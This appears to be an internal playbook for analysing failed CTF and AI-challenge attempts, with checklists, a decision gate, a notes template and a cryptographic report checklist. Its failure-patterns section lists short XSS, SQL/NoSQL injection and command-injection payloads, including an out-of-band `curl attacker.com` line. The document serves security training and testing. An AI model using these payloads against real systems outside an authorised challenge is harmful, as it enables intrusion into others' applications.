# Failure Analysis Protocol

**Owner:** cyber-operator, ai-sec-agent
**Purpose:** Structured failure analysis for CTF and AI challenges — learn from what didn't work so it informs the next attempt

---

## When to Run This Protocol

Run IMMEDIATELY when:
- Challenge session ends without capturing flag
- Stuck on same challenge for 2+ sessions
- Tried 3+ techniques with no clear progress
- Challenge seems solvable but approaches keep failing

---

## Step 1: Failure Classification

Identify which category best describes the failure:

| Class | Description | Next Action |
|-------|-------------|-------------|
| **Wrong Vuln Class** | Targeting XSS when it's SQLi, etc. | Start fresh — re-enumerate from scratch |
| **Right Class, Wrong Payload** | Correct approach, payload not working | Research deeper payloads for this class |
| **Right Class, Wrong Target** | Right attack, wrong parameter/endpoint | Enumerate more endpoints, check JS files |
| **WAF/Filter Blocking** | Payloads detected and blocked | Bypass encoding, case variation, fragmentation |
| **Environmental** | Race condition, encoding issue, timing | Retry with adjustments |
| **Missing Context** | Don't understand the app well enough | Back to recon — read source, check JS, test all inputs |
| **Knowledge Gap** | Don't know enough about this vuln class | Study first: PortSwigger Web Academy |
| **Wrong Crypto Math** | Used simplified model instead of actual spec | Read the RFC/spec. Verify PoC against real library, not a mock. |

---

## Step 2: Evidence Review

Before giving up on any approach, confirm:

```
□ Did I test ALL input parameters? (not just the obvious ones)
□ Did I check HTTP headers as injection points?
□ Did I try the attack from an authenticated vs unauthenticated context?
□ Did I check the response body AND headers AND status codes?
□ Did I look at the JavaScript for client-side hints?
□ Did I check cookies and local storage?
□ Did I try encoding variations (URL encode, double encode, HTML entities)?
□ Did I try case variations (ScRiPt, SCRIPT, script)?
□ Did I try out-of-band (if direct reflection isn't happening)?
```

---

## Step 3: Vault Recall Trigger

Before trying a new approach, mandatory recall:

```
1. Check notes/ctf/techniques-learned.md
   → "Rabbit Holes" section for this vuln class — am I about to repeat?
   → "What Worked" section — any transferable pattern?

2. Check a technique-reference note (or relevant pattern)
   → Any payload I haven't tried?

3. Check notes/ctf/{Platform}/
   → Similar challenge writeup for inspiration?
```

---

## Step 4: Decision Gate

After classification and recall, choose one path:

```
A. PIVOT: Wrong class confirmed → restart enumeration with fresh eyes
B. ESCALATE: Right class, need better payload → research + PortSwigger
C. CONTINUE: Right approach, need more enumeration → document and try specific next step
D. PARK: Stuck 3+ sessions → document fully in Failed Attempt template, move on, return later
E. GET HINT: Challenge has official hints → use the hint, document what it revealed
```

**Path D is NOT failure.** Coming back with fresh perspective after working other challenges is legitimate strategy. Document everything first.

---

## Step 5: Update techniques-learned.md

Regardless of which path you chose, add an entry:

```markdown
## {Vuln Class} — FAILED APPROACH
**Date:** {YYYY-MM-DD} | **Challenge:** {Name}
**Class:** {failure classification from Step 1}

**Ruled Out (DO NOT repeat):**
- {approach 1} — {why it didn't work}
- {approach 2} — {why it didn't work}

**Why:** {root cause of failure — what was different about this app vs expectation}

**Next session start here:** {specific thing to try}
```

---

## Failure Patterns Library

### "No XSS Reflection" — Common Causes
1. Server-side sanitization (try stored XSS instead of reflected)
2. CSP blocking script execution (check headers)
3. Payload reaching DOM but not executing (try DOM XSS payloads)
4. Reflection in attribute context (use `" onmouseover="alert(1)` syntax)

### "SQLi Gives No Error" — Common Causes
1. Errors suppressed but query still affected (try blind boolean SQLi)
2. Input parameterized correctly (try a different parameter)
3. WAF stripping quotes (try URL encoding: `%27`, `%2527`)
4. Not a SQL backend (try NoSQL injection: `{"$gt": ""}`)

### "IDOR Parameter Doesn't Change" — Common Causes
1. ID encoded (base64, JWT) — decode first
2. Checking wrong parameter (check ALL parameters including headers)
3. Access control enforced at object level (try horizontal vs vertical privilege)
4. Rate limited — add delay between requests

### "Command Injection Doesn't Execute" — Common Causes
1. Shell metacharacters filtered (try `%0a`, `$(cmd)`, `` `cmd` ``)
2. Executed in non-shell context (try `; cmd`, `|| cmd`, `&& cmd`)
3. Output not returned (try out-of-band: `curl attacker.com`)
4. Sandbox environment (check what binaries are available)

---

## Crypto Vulnerability Pre-Submission Checklist

Run this before submitting any cryptographic vulnerability report:

```
□ Did I use the ACTUAL signing equation from the RFC/spec — not a simplified model?
  → FROST: RFC 9591 uses z_i = d_i + e_i·ρ_i + λ_i·x_i·c (binding nonce, NOT s = r + c·x)
  → ECDSA: verify nonce bias math with actual bit count and lattice dimension

□ Did I count equations vs unknowns correctly?
  → FROST nonce reuse: 3 unknowns (d, e, x) → need 3 reuses, NOT 2

□ Did my PoC test against the ACTUAL library — not a simplified mock?
  → frost-secp256k1-tr behaves differently than a vanilla Schnorr mock
  → If PoC only works against your own simplified implementation, it's invalid

□ Did I map the FULL signing architecture before claiming end-to-end impact?
  → Nested threshold schemes: recovering one party's key share ≠ full compromise
  → Identify ALL parties required for a valid aggregate signature
  → Identify what authentication layers exist OUTSIDE the crypto (e.g., SE gRPC auth)

□ Is the attacker model realistic?
  → Can an unauthenticated external attacker actually observe the inputs I'm using?
  → Or does the attack require insider/co-signer access?
```

---

## Integration

After running this protocol:
- Updated: `notes/ctf/{Platform}/techniques-learned.md`
- Updated: Failed Attempt writeup (increment `attempt_number`)
- If Path D chosen: note `status: partial` or `status: abandoned` in frontmatter

---

*Failure Analysis Protocol v1.0 | cyber-operator + ai-sec-agent | 2026-02-23*
